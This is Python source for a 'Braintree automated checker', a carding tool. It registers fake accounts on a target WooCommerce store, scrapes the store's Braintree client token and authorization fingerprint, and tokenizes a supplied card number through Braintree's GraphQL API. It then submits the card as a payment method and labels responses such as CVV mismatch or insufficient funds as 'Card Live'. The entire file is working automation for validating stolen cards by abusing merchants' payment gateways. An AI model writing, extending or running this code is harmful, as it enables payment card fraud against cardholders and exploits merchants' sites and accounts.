import requests
import httpx
import re
import base64
import json
import random
import string
import time
from bs4 import BeautifulSoup
from faker import Faker

fake = Faker()

class BraintreeAutomatedChecker:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = True
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        self.base_url = ""
        self.headers = {
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        self.account_created = False
        self.logged_in = False

    def normalize_card_data(self, card_data):
        """Normalize card data format"""
        parts = card_data.strip().split('|')
        if len(parts) != 4:
            raise ValueError("Invalid card format. Use: cardnumber|mm|yy|cvv")
        
        card, month, year, cvv = parts
        month = month.zfill(2)
        if len(year) == 2:
            year = f"20{year}"
        
        return card.strip(), month.strip(), year.strip(), cvv.strip()

    def generate_fake_user(self):
        """Generate fake user data using Faker"""
        first_name = fake.first_name()
        last_name = fake.last_name()
        username = f"{first_name.lower()}{random.randint(1000, 9999)}"
        email = f"{username}@{random.choice(['gmail.com', 'yahoo.com', 'outlook.com'])}"
        password = "Test@12345"
        phone = fake.phone_number()
        
        address = fake.street_address()
        city = fake.city()
        state = fake.state_abbr()
        zipcode = fake.zipcode()
        country = "US"
        
        return {
            'first_name': first_name,
            'last_name': last_name,
            'username': username,
            'email': email,
            'password': password,
            'phone': phone,
            'address': address,
            'city': city,
            'state': state,
            'zipcode': zipcode,
            'country': country
        }

    def find_nonce(self, html, patterns):
        """Find nonce in HTML using multiple patterns"""
        for pattern in patterns:
            match = re.search(pattern, html)
            if match:
                return match.group(1)
        return None

    def try_register_account(self, site_url):
        """Try to register a new account"""
        print("\n[STEP 1] Attempting to register new account...")
        
        user_data = self.generate_fake_user()
        
        try:
            response = self.session.get(f"{site_url}/my-account/", headers=self.headers)
            
            register_patterns = [
                r'name="woocommerce-register-nonce" value="([^"]+)"',
                r'name="register-nonce" value="([^"]+)"',
                r'id="woocommerce-register-nonce" value="([^"]+)"'
            ]
            
            register_nonce = self.find_nonce(response.text, register_patterns)
            
            if not register_nonce:
                print("   ⚠️ Registration not available, will try without login")
                return False
            
            data = {
                'username': user_data['username'],
                'email': user_data['email'],
                'password': user_data['password'],
                'woocommerce-register-nonce': register_nonce,
                '_wp_http_referer': '/my-account/',
                'register': 'Register',
            }
            
            response = self.session.post(f"{site_url}/my-account/", headers=self.headers, data=data)
            
            if 'logout' in response.text.lower() or 'sign out' in response.text.lower():
                print(f"   ✅ Account created: {user_data['email']}")
                self.user_data = user_data
                self.account_created = True
                self.logged_in = True
                return True
            else:
                print("   ⚠️ Registration failed, continuing without login")
                return False
                
        except Exception as e:
            print(f"   ⚠️ Error during registration: {e}")
            return False

    def add_billing_address(self, site_url):
        """Add billing address to account"""
        if not self.account_created:
            return True
            
        print("\n[STEP 2] Adding billing address...")
        
        try:
            response = self.session.get(f"{site_url}/my-account/edit-address/billing/", headers=self.headers)
            
            address_patterns = [
                r'name="woocommerce-edit-address-nonce" value="([^"]+)"',
                r'id="woocommerce-edit-address-nonce" value="([^"]+)"'
            ]
            
            address_nonce = self.find_nonce(response.text, address_patterns)
            
            if not address_nonce:
                print("   ⚠️ Could not find address nonce, continuing anyway")
                return True
            
            data = {
                'billing_first_name': self.user_data['first_name'],
                'billing_last_name': self.user_data['last_name'],
                'billing_company': '',
                'billing_country': self.user_data['country'],
                'billing_address_1': self.user_data['address'],
                'billing_address_2': '',
                'billing_city': self.user_data['city'],
                'billing_state': self.user_data['state'],
                'billing_postcode': self.user_data['zipcode'],
                'billing_phone': self.user_data['phone'],
                'billing_email': self.user_data['email'],
                'save_address': 'Save address',
                'woocommerce-edit-address-nonce': address_nonce,
                '_wp_http_referer': '/my-account/edit-address/billing/',
                'action': 'edit_address',
            }
            
            response = self.session.post(
                f"{site_url}/my-account/edit-address/billing/",
                headers=self.headers,
                data=data
            )
            
            print("   ✅ Billing address added")
            return True
            
        except Exception as e:
            print(f"   ⚠️ Error adding address: {e}")
            return True

    def get_braintree_token(self, site_url):
        """Get Braintree client token from various endpoints"""
        print("\n[STEP 3] Fetching Braintree client token...")
        
        endpoints = [
            '/my-account/add-payment-method/',
            '/checkout/',
            '/membership-checkout/',
            '/my-account/payment-methods/'
        ]
        
        for endpoint in endpoints:
            try:
                url = f"{site_url}{endpoint}"
                response = self.session.get(url, headers=self.headers)
                
                token_patterns = [
                    r'wc_braintree_client_token\s*=\s*\[\s*["\']([^"\']+)["\']\s*\]',
                    r'var wc_braintree_client_token = \["([^"]+)"\]',
                    r'clientToken["\']?\s*:\s*["\']([^"\']+)["\']',
                    r'"client_token":"([^"]+)"',
                    r'client_token_nonce":"([^"]+)"'
                ]
                
                for pattern in token_patterns:
                    match = re.search(pattern, response.text)
                    if match:
                        encoded_token = match.group(1)
                        
                        if 'nonce' in pattern:
                            nonce_value = encoded_token
                            ajax_token = self.get_token_via_ajax(site_url, nonce_value)
                            if ajax_token:
                                return ajax_token, url
                        else:
                            print(f"   ✅ Token found at {endpoint}")
                            return encoded_token, url
                            
            except Exception as e:
                continue
        
        print("   ❌ Could not find Braintree token")
        return None, None

    def get_token_via_ajax(self, site_url, nonce):
        """Get token via AJAX endpoint"""
        try:
            headers = self.headers.copy()
            headers['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
            headers['X-Requested-With'] = 'XMLHttpRequest'
            
            data = {
                'action': 'wc_braintree_credit_card_get_client_token',
                'nonce': nonce,
            }
            
            response = self.session.post(
                f"{site_url}/wp-admin/admin-ajax.php",
                headers=headers,
                data=data
            )
            
            result = response.json()
            if 'data' in result:
                return result['data']
                
        except Exception as e:
            pass
        
        return None

    def decode_braintree_token(self, encoded_token):
        """Decode base64 Braintree token"""
        try:
            padding = 4 - len(encoded_token) % 4
            if padding != 4:
                encoded_token += '=' * padding
            
            decoded_bytes = base64.b64decode(encoded_token)
            decoded_json = json.loads(decoded_bytes.decode('utf-8'))
            
            print("   ✅ Token decoded successfully")
            return decoded_json
        except Exception as e:
            print(f"   ❌ Failed to decode token: {e}")
            return None

    def get_authorization_fingerprint(self, decoded_token):
        """Extract authorization fingerprint"""
        if isinstance(decoded_token, dict) and 'authorizationFingerprint' in decoded_token:
            fingerprint = decoded_token['authorizationFingerprint']
            print("   ✅ Authorization fingerprint extracted")
            return fingerprint
        
        print("   ❌ No authorization fingerprint found")
        return None

    def tokenize_credit_card(self, card_data, authorization_fingerprint):
        """Tokenize credit card via Braintree API"""
        print("\n[STEP 4] Tokenizing credit card...")
        
        card, month, year, cvv = card_data
        
        headers = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {authorization_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': self.user_agent,
        }
        
        session_id = ''.join(random.choices(string.hexdigits.lower(), k=36))
        
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': session_id,
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': card,
                        'expirationMonth': month,
                        'expirationYear': year,
                        'cvv': cvv,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        
        try:
            response = self.session.post(
                'https://payments.braintree-api.com/graphql',
                headers=headers,
                json=json_data,
                timeout=30
            )
            
            if response.status_code == 200:
                result = response.json()
                if 'data' in result and 'tokenizeCreditCard' in result['data']:
                    token = result['data']['tokenizeCreditCard']['token']
                    print(f"   ✅ Card tokenized successfully")
                    return token
                else:
                    print(f"   ❌ Tokenization failed: {result.get('errors', 'Unknown error')}")
            else:
                print(f"   ❌ API request failed: {response.status_code}")
                
        except Exception as e:
            print(f"   ❌ Tokenization error: {e}")
        
        return None

    def submit_payment_method(self, site_url, token, payment_page_url):
        """Submit payment method to the site"""
        print("\n[STEP 5] Submitting payment method...")
        
        response = self.session.get(payment_page_url, headers=self.headers)
        
        add_nonce_patterns = [
            r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"',
            r'name="pmpro_checkout_nonce" value="([^"]+)"',
            r'id="woocommerce-add-payment-method-nonce" value="([^"]+)"'
        ]
        
        add_nonce = self.find_nonce(response.text, add_nonce_patterns)
        
        device_session_id = ''.join(random.choices(string.hexdigits.lower(), k=32))
        correlation_id = ''.join(random.choices(string.hexdigits.lower(), k=24))
        
        data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': token,
            'braintree_cc_device_data': f'{{"device_session_id":"{device_session_id}","fraud_merchant_id":null,"correlation_id":"{correlation_id}"}}',
            'braintree_cc_3ds_nonce_key': '',
            'woocommerce_add_payment_method': '1',
        }
        
        if add_nonce:
            data['woocommerce-add-payment-method-nonce'] = add_nonce
            data['_wp_http_referer'] = '/my-account/add-payment-method/'
        
        endpoints = [
            payment_page_url,
            f"{site_url}/my-account/add-payment-method/",
            f"{site_url}/wp-admin/admin-ajax.php",
        ]
        
        for endpoint in endpoints:
            try:
                response = self.session.post(
                    endpoint,
                    data=data,
                    headers=self.headers,
                    timeout=30,
                    allow_redirects=True
                )
                
                if response.status_code == 200:
                    print(f"   ✅ Payment method submitted")
                    return response.text
                    
            except Exception as e:
                continue
        
        print("   ❌ Failed to submit payment method")
        return None

    def analyze_result(self, response_text):
        """Analyze the response for success/failure"""
        if not response_text:
            return "❌ No response received"
        
        soup = BeautifulSoup(response_text, 'html.parser')
        
        error_keywords = {
            'call issuer': '❌ DECLINED - Call Issuer',
            'card issuer declined cvv': '✅ APPROVED - CVV Declined (Card Live)',
            'cvv': '✅ APPROVED - CVV Mismatch (Card Live)',
            'insufficient funds': '✅ APPROVED - Insufficient Funds (Card Live)',
            'transaction not allowed': '❌ DECLINED - Transaction Not Allowed',
            'do not honor': '❌ DECLINED - Do Not Honor',
            'expired card': '❌ DECLINED - Expired Card',
            'invalid card': '❌ DECLINED - Invalid Card',
            'card not activated': '❌ DECLINED - Card Not Activated',
            'closed card': '❌ DECLINED - Closed Card',
            'pickup card': '❌ DECLINED - Pickup Card',
            'payment method added': '✅ APPROVED - Payment Method Added',
            'successfully added': '✅ APPROVED - Successfully Added',
        }
        
        response_lower = response_text.lower()
        
        for keyword, status in error_keywords.items():
            if keyword in response_lower:
                return status
        
        error_selectors = [
            '.woocommerce-error',
            '.woocommerce-message',
            '.pmpro_message',
            '.error',
            '[class*="error"]'
        ]
        
        for selector in error_selectors:
            errors = soup.select(selector)
            for error in errors:
                error_text = error.get_text(strip=True)
                if error_text and len(error_text) > 10:
                    for keyword, status in error_keywords.items():
                        if keyword in error_text.lower():
                            return status
                    return f"❌ {error_text[:100]}"
        
        return "⚠️ Unknown response - manual check required"

    def check_card(self, site_url, card_data):
        """Main function to check credit card"""
        print("\n" + "="*60)
        print("🔍 BRAINTREE AUTOMATED CHECKER")
        print("="*60)
        print(f"\n🌐 Target Site: {site_url}")
        
        try:
            normalized_card = self.normalize_card_data(card_data)
            masked_card = f"{normalized_card[0][:6]}******{normalized_card[0][-4:]}|{normalized_card[1]}|{normalized_card[2]}|***"
            print(f"💳 Card: {masked_card}")
            print("\n" + "-"*60)
            
            self.try_register_account(site_url)
            self.add_billing_address(site_url)
            
            encoded_token, payment_url = self.get_braintree_token(site_url)
            if not encoded_token:
                return "❌ No Braintree token found - site may not use Braintree"
            
            decoded_token = self.decode_braintree_token(encoded_token)
            if not decoded_token:
                return "❌ Failed to decode Braintree token"
            
            fingerprint = self.get_authorization_fingerprint(decoded_token)
            if not fingerprint:
                return "❌ No authorization fingerprint found"
            
            card_token = self.tokenize_credit_card(normalized_card, fingerprint)
            if not card_token:
                return "❌ Card tokenization failed"
            
            result_html = self.submit_payment_method(site_url, card_token, payment_url)
            
            result = self.analyze_result(result_html)
            
            return result
            
        except Exception as e:
            return f"❌ Error: {str(e)}"

def main():
    print("\n" + "="*60)
    print("🚀 BRAINTREE AUTOMATED GATEWAY CHECKER")
    print("="*60)
    print("\nThis tool will automatically:")
    print("  1. Register account (if needed)")
    print("  2. Add billing address")
    print("  3. Extract Braintree tokens")
    print("  4. Tokenize credit card")
    print("  5. Submit payment method")
    print("  6. Analyze result")
    print("\n" + "="*60)
    
    site_url = input("\n🌐 Enter the target site URL: ").strip()
    if not site_url.startswith(('http://', 'https://')):
        site_url = 'https://' + site_url
    
    site_url = site_url.rstrip('/')
    
    card_data = input("💳 Enter card data (format: cardnumber|mm|yy|cvv): ").strip()
    
    checker = BraintreeAutomatedChecker()
    
    result = checker.check_card(site_url, card_data)
    
    print("\n" + "="*60)
    print("📊 FINAL RESULT")
    print("="*60)
    print(f"\n{result}\n")
    print("="*60)

if __name__ == "__main__":
    main()
